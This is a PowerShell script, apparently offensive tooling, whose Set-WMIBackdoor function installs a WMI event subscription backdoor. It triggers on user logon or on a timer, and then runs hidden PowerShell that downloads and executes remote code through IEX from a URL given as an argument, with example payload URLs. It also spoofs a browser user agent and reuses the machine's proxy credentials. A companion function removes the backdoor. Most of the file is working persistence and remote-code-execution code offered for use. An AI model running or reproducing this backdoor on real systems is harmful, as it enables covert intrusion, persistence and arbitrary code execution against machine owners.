<#

.SYNOPSIS
This script contains two function that will create or remove a backdoor using WMI event subscriptions. These functions can only be used as an administrator.

.DESCRIPTION
This script contains two functions that will create or remove a backdoor using WMI event subscriptions. Currently there are only two triggers that can be used.
The first triggers an event once an interactive or cached interactive session has been established. A username can be utilized to create a more specific trigger.
The second will trigger once a specific time has been met and will also trigger every subsequent hour afterwards. When an event is triggered, a powershell download cradle will connect to the URL specified.

.PARAMETER URL
The URL for the powershell download cradle.

.PARAMETER FilterName
The name to use for the Event Filter and Consumer. Make note of this name, it will be used to remove the backdoor!

.PARAMETER Interval
Interval to be used for how often to send notifications for events. In seconds. Avoid using small intervals. 

.SWITCH UserTrigger
Use the logon event filter

.SWITCH TimeTrigger
Use the time event filter

.PARAMETER Time
Specificy time to trigger an event when using the time event filter. In 24 HR format.

.EXAMPLE

Set an interactive logon event filter that when triggered, will launch a download cradle every 400 seconds.

Set-WMIBackdoor -URL "http://www.posh.com/Ps1Payload" -Name "PWN" -Interval 400 -UserTrigger

.EXAMPLE

Set a time event filter for everyday at 10:30 AM and every subsequent hour afterwards, everyday.

Set-WMIBackdoor -URL "http://www.posh.com/Ps1Payload" -Name "PWN" -TimeTrigger -Time "10:30" 

.EXAMPLE

Set a time event filter for time triggered, will launch a download cradle every some seconds.

Set-WMIBackdoor -URL "http://www.posh.com/Ps1Payload" -Name "PWN" -TimeExecTrigger -TimeExecTime 60

.EXAMPLE

Remove the Consumer, Filter, and Binding with the name "PWN"

Remove-WMIBackdoor PWN


#>

Function Set-WMIBackdoor
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,Position= 0)]
        [string]$URL,

        [Parameter(Mandatory=$True,Position= 1)]
        [string]$Name,

        [Parameter(Mandatory=$True,Position= 2, ParameterSetName= "User")]
        [int]$Interval=500,

        [Parameter(Mandatory=$False, ParameterSetName= "User")]
        [switch]$UserTrigger,

        [Parameter(Mandatory=$False, ParameterSetName= "User")]
        [string]$UserName,

        [Parameter(Mandatory=$False, ParameterSetName="Time")]
        [switch]$TimeTrigger,

        [Parameter(Mandatory=$True, ParameterSetName="Time")]
        [string]$Time="10:30",

        [Parameter(Mandatory=$False, ParameterSetName="Time2")]
        [switch]$TimeExecTrigger,

        [Parameter(Mandatory=$True, ParameterSetName="Time2")]
        [string]$TimeExecTime="1"
    )

    
    #Build the Query 
    

    if($PsCmdlet.ParameterSetName -eq "User")
    {
       
        if($UserName)
        {
            
            $SID= $(Get-WmiObject -Class "Win32_UserAccount" -Filter "Name='$($UserName)'").SID
            if(!($SID))
            {
                Throw "Unable obtain SID for the specified user: $UserName"
            }
        }
                

                
        if($SID)
        {
            $Query = "SELECT * FROM __InstanceModificationEvent WITHIN $interval 
                             WHERE (TargetInstance ISA 'Win32_UserProfile')
                             and (TargetInstance.Loaded <> PreviousInstance.Loaded)  
                             and (TargetInstance.SID = '$SID') 
                             and (TargetInstance.Loaded = TRUE)"                    
        }
        else
        {
            $Query = "SELECT * FROM __InstanceCreationEvent WITHIN $Interval 
                             WHERE TargetInstance ISA 'Win32_LogonSession'  
                             AND (TargetInstance.LogonType = 2
                             OR TargetInstance.LogonType = 11)" 
        }
    }
    elseif($PsCmdlet.ParameterSetName -eq "Time")
    {
        $Hour = $time.Split(":")[0]
        $Min = $time.Split(":")[-1] 
        $Query = "SELECT * FROM __InstanceModificationEvent WHERE 
                           TargetInstance ISA 'Win32_LocalTime' 
                           and ( TargetInstance.Hour >= $Hour and TargetInstance.Minute = $Min and TargetInstance.Second = 0)"
    }
    elseif($PsCmdlet.ParameterSetName -eq "Time2")
    {
        $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 
                            $TimeExecTime WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }

    
    #Build the filter
    
   
    $NS = "root\subscription"
    $FilterArgs = @{
        Name=$Name
        EventNameSpace="root\cimv2"
        QueryLanguage="WQL"
        Query=$Query
    }
    $Filter = Set-WmiInstance -Namespace $NS -Class "__EventFilter" -Arguments $FilterArgs
    
    


    #Build the Consumer
    
    $ConsumerName = $Name

    $command = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy = [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.DownloadString('$URL'))"
    
    #$encCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
    
    $commandLine = "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -NoP -NonI -w hidden -Command $command"  
    
    $ConsumerArgs = @{
        Name=$ConsumerName
        CommandLineTemplate=$commandLine
    }
    
    

    $consumer = Set-WmiInstance -Class "CommandLineEventConsumer" -Namespace $NS -Arguments $ConsumerArgs
    
    #Bind filter and consumer
    
    $Args = @{
       Filter = $Filter
       Consumer = $consumer
    }
    
    
    
    Set-WmiInstance -Class "__FilterToConsumerBinding" -Namespace "root\subscription" -Arguments $Args

    Get-WmiObject -Namespace $NS -Class "CommandLineEventConsumer" | Where-Object {$_.Name -eq $Name}
          
}


Function Remove-WmiBackdoor
{
    <#
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, Position = 0)]
        [string]$FilterName
    )


    $ns = "root\subscription"
    $Binding = "__FilterToConsumerBinding"
    $Filter = "__EventFilter"
    $Consumer = "CommandLineEventConsumer"


    #Remove the binding first
    if(Get-WmiObject -Namespace $ns -Class $Binding | Where-Object {$_.Consumer -like "*$FilterName*"})
    {
        try
        {
            Get-WmiObject -Namespace $ns -Class $Binding | Where-Object {$_.Consumer -like "*$FilterName*"} | Remove-WmiObject
            Write-Host "Binding has been removed"
        }
        catch
        {
            Write-Warning "Unable to remove FilterToConsumberBinding with the name: $FilterName"
        }
    }
    else
    {
        Write-Warning "Unable to find FilterToConsumberBinding with the name: $FilterName"
    }

    #Remove the filter
    if(Get-WmiObject -Namespace $ns -Class $Filter | Where-Object {$_.Name -eq "$FilterName"})
    {
        try
        {
            Get-WmiObject -Namespace $ns -Class $Filter | Where-Object {$_.Name -eq "$FilterName"} | Remove-WmiObject
            Write-Host "Filter has been removed"    
        }
        catch
        {
            Write-Warning "Unable to remove Event Filter with the Name: $FilterName"
        }
    }
    else
    {
        Write-Warning "Unable to find Event Filter with the name: $FilterName"
    }

    #Remove the Consumer
    if(Get-WmiObject -Namespace $ns -Class $Consumer | Where-Object {$_.Name -eq "$FilterName"})
    {
        try
        {
            Get-WmiObject -Namespace $ns -Class $Consumer | Where-Object {$_.Name -eq "$FilterName"} | Remove-WmiObject
            Write-Host "Consumer has been removed"    
        }
        catch
        {
            Write-Warning "Unable to remove Consumer with the Name: $FilterName"
        }
    }
    else
    {
        Write-Warning "Unable to find Consumer with the name: $FilterName"
    }
}